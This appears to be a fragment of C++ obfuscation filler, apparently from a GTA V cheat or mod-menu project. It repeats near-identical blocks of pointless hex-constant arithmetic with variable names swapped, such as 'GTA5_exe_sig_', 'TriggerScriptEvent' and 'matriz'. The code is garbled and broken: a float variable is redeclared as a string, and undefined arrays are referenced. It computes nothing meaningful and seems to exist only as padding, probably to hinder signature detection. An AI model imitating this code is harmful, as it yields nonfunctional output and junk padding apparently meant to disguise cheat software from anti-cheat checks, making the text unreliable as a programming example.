					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<Yaw>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</Yaw>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
